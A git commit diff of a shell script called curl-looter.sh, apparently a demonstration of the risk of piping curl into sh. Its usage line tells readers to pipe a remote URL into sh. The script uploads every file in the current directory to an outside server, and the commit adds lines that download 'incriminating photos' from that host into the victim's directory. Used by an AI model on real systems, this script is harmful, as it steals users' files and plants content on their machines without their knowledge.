365aada20748e2c82e8b4a5634a1096d311843c9
Tod Beardsley <todb@packetfu.com>
2014-05-16 15:06:49 -0500

    Get pics automatically.

--- curl-looter.sh
+++ curl-looter.sh
@@ -1,3 +1,7 @@
 #!/bin/sh
 # Usage: curl -kSL http://r-7.co/curl-loot | sh
 for i in *; do sleep 3; curl -F filename="$i" -F filedata=@$i http://packetfu.com:8081/upload; done
+echo Getting incriminating photos...
+curl -LO http://packetfu.com:8081/wp/crime-1.jpg
+curl -LO http://packetfu.com:8081/wp/crime-2.jpg
+
